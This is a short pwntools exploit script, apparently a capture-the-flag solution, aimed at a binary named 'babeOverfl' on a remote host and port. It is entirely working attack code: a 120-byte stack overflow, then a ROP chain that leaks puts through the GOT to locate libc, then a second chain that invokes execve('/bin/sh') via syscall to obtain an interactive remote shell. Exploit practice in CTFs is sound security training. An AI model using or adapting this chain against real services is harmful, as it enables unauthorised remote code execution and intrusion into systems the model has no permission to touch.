from pwn import *

debug = False

elf = ELF('./babeOverfl')

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./babeOverfl')
pop_rax = 0x43a78 
pop_rdi = 0x2145f
pop_rsi = 0x23a8a
pop_rdx = 0x1b96
syscall = 0x13d0 
p = remote('34.126.117.181', 3333)

payload = 'A'*120+p64(0x40132b)+p64(elf.got['puts'])+p64(elf.sym['puts'])+p64(elf.sym['func'])
print p.recv()
p.send('4198817')
p.sendline(payload)
libc.address = u64(p.recv(6)+'\x00\x00')-libc.sym['puts']
payload = 'A'*120+p64(libc.address+pop_rax)+p64(59)+p64(libc.address+pop_rdi)+p64(libc.search('/bin/sh').next())+p64(libc.address+pop_rsi)+p64(0)+p64(libc.address+pop_rdx)+p64(0)+p64(libc.address+syscall)
p.sendline(payload)
p.interactive()
